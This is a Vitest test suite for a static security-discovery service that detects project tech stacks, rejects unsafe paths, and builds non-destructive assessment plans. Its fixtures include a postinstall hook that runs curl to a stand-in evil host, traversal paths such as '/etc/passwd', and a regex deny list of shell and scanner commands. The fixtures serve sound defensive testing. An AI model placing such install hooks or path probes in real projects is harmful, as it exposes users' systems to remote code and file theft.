import { describe, expect, it, vi } from "vitest";

vi.mock("server-only", () => ({}));

import { SECURITY_CAPABILITIES } from "../../src/server/product/security/capabilities";
import { discoverSecurityStack } from "../../src/server/product/security/discovery";
import { createSecurityAssessmentPlan } from "../../src/server/product/security/planner";
import { SecurityAssessmentService } from "../../src/server/product/security/service";
import type { ProjectSourceFile, SecurityDiscoveryInput } from "../../src/server/product/security/types";

const REVISION = "dae3b6bedb6f7d38481bc1de0d8bc61f0d7799e3";
const session = {
  id: "sid",
  identity: { userRef: "user-a", subject: "sub-a" },
  workspace: { id: "ws-a", organizationId: "org-a", name: "Workspace" },
  version: 1,
  issuedAt: 1,
  expiresAt: Date.now() + 60_000,
  correlationId: "corr",
  csrfToken: "csrf",
  principalMapping: { state: "unmapped" as const },
  oidcTokens: {},
};

function discovery(files: ProjectSourceFile[], extra: Partial<SecurityDiscoveryInput> = {}) {
  return discoverSecurityStack({ projectId: "proj-a", sourceRevision: REVISION, files, ...extra });
}

describe("BE8 static security discovery", () => {
  it("detects React/Next.js/JavaScript from package metadata with provenance and without executing scripts", () => {
    const result = discovery([{ path: "frontend/package.json", content: JSON.stringify({ scripts: { postinstall: "curl https://evil.invalid" }, dependencies: { next: "16.3.6", react: "19.3.0", pg: "8.23.0" } }) }], { callerDeclaredStack: ["dotnet"] });
    expect(result.callerDeclaredStackIgnored).toBe(true);
    expect(result.safety).toEqual({ packageScriptsExecuted: false, networkUsed: false, dependencyInstallAttempted: false, arbitraryHostPathsAccepted: false });
    expect(result.detected.map((tech) => tech.id)).toEqual(expect.arrayContaining(["javascript", "node", "nextjs", "react", "postgresql", "package-scripts-present"]));
    expect(result.detected.find((tech) => tech.id === "nextjs")?.provenance[0]).toMatchObject({ sourceType: "manifest", path: "frontend/package.json", detectorVersion: "BE8_STATIC_DISCOVERY_V1" });
  });

  it("detects .NET/C# from project files and source distribution", () => {
    const result = discovery([
      { path: "api/App.csproj", content: "<Project><PropertyGroup><TargetFramework>net9.0</TargetFramework></PropertyGroup></Project>" },
      { path: "api/Program.cs", content: "var builder = WebApplication.CreateBuilder(args);" },
    ]);
    expect(result.detected.map((tech) => tech.id)).toEqual(expect.arrayContaining(["dotnet", "csharp", "dotnet-target-framework"]));
    expect(result.detected.find((tech) => tech.id === "dotnet-target-framework")?.version).toBe("net9.0");
  });

  it("detects mixed-stack projects without replacing evidence with caller assertions", () => {
    const result = discovery([
      { path: "package.json", content: JSON.stringify({ dependencies: { "@angular/core": "21.0.0" } }) },
      { path: "service/main.go", content: "package main" },
      { path: "infra/main.tf", content: "resource \"x\" \"y\" {}" },
      { path: ".gitlab-ci.yml", content: "stages: [test]" },
    ], { callerDeclaredStack: ["ruby-on-rails"] });
    expect(result.detected.map((tech) => tech.id)).toEqual(expect.arrayContaining(["angular", "go", "terraform", "gitlab-ci"]));
    expect(result.callerDeclaredStackIgnored).toBe(true);
  });

  it("reports unknown stack rather than fabricating technologies", () => {
    const result = discovery([{ path: "README.md", content: "notes only" }]);
    expect(result.unknown).toBe(true);
    expect(result.detected).toEqual([]);
  });

  it("rejects malicious paths, symlink/path escape, oversized manifests, binary files, and malformed manifests as unsupported facts", () => {
    const result = discovery([
      { path: "../secret/package.json", content: "{}" },
      { path: "/etc/passwd", content: "root" },
      { path: "linked/package.json", kind: "symlink", content: "{}" },
      { path: "large/package.json", content: "{}", sizeBytes: 999_999 },
      { path: "bin/blob.lock", binary: true },
      { path: "bad/package.json", content: "{ not json" },
    ]);
    expect(result.unsupported.map((item) => item.reason)).toEqual(expect.arrayContaining(["MALICIOUS_PATH", "SYMLINK_UNSUPPORTED", "OVERSIZED_MANIFEST", "BINARY_UNPARSEABLE", "MALFORMED_MANIFEST"]));
  });
});

describe("BE8 capability registry and planner", () => {
  it("defines server-owned capability categories without execution authority", () => {
    expect(SECURITY_CAPABILITIES.map((capability) => capability.id)).toEqual(expect.arrayContaining(["SAST", "SCA", "SECRET_SCAN", "SBOM", "DAST", "API_SECURITY", "CONTAINER_SCAN", "IAC_SCAN", "TLS_NETWORK", "HOST_RUNTIME", "RUNTIME_BEHAVIOR", "SUPPLY_CHAIN", "AUTH_IDENTITY", "CUSTOM_POLICY"]));
    expect(SECURITY_CAPABILITIES.every((capability) => capability.destructive === false)).toBe(true);
  });

  it("generates deterministic bounded plans and preserves unavailable requirements", () => {
    const result = discovery([
      { path: "package.json", content: JSON.stringify({ dependencies: { next: "16.3.6", react: "19.3.0" } }) },
      { path: "Dockerfile", content: "FROM node:24" },
      { path: "openapi.json", content: "{}" },
    ]);
    const planA = createSecurityAssessmentPlan(result);
    const planB = createSecurityAssessmentPlan(result);
    expect(planA.planId).toBe(planB.planId);
    expect(planA.executionAuthority).toBe(false);
    expect(planA.safetyClassification).toBe("NON_DESTRUCTIVE_STATIC_PLAN");
    expect(planA.selectedCapabilities.find((item) => item.capabilityId === "SAST")?.state).toBe("APPLICABLE");
    expect(planA.selectedCapabilities.find((item) => item.capabilityId === "DAST")?.state).toBe("REQUIRES_DEPLOYMENT");
    expect(planA.selectedCapabilities.find((item) => item.capabilityId === "SCA")?.state).toBe("REQUIRES_NETWORK");
    expect(planA.selectedCapabilities.find((item) => item.capabilityId === "CONTAINER_SCAN")?.state).toBe("REQUIRES_BUILD");
    expect(planA.prerequisites).toEqual(expect.arrayContaining(["DAST:REQUIRES_DEPLOYMENT", "SCA:REQUIRES_NETWORK", "CONTAINER_SCAN:REQUIRES_BUILD"]));
  });

  it("keeps UNKNOWN as UNKNOWN and does not convert it into APPLICABLE", () => {
    const plan = createSecurityAssessmentPlan(discovery([{ path: "README.md", content: "unknown" }]));
    expect(plan.selectedCapabilities.find((item) => item.capabilityId === "SAST")?.state).toBe("UNKNOWN");
    expect(plan.selectedCapabilities.find((item) => item.capabilityId === "API_SECURITY")?.state).toBe("UNKNOWN");
  });

  it("prevents caller spoofing and scanner command injection through plan inputs", () => {
    const result = discovery([{ path: "README.md", content: "nothing" }], { callerDeclaredStack: ["nextjs", "dotnet"], assessmentIntent: "pipeline" });
    const plan = createSecurityAssessmentPlan(result);
    expect(result.detected).toEqual([]);
    expect(JSON.stringify(plan)).not.toMatch(/docker run|curl|run_scanner|shell_exec|hostPath|--privileged/i);
  });

  it("requires workspace scope through the product service and denies cross-workspace/no-workspace sessions", () => {
    const service = new SecurityAssessmentService();
    expect(() => service.discover({ ...session, workspace: undefined } as never, { projectId: "proj-a", sourceRevision: REVISION, files: [] })).toThrow("security_workspace_required");
    expect(() => service.discover(session as never, { projectId: "../other", sourceRevision: REVISION, files: [] })).toThrow("security_project_invalid");
  });
});
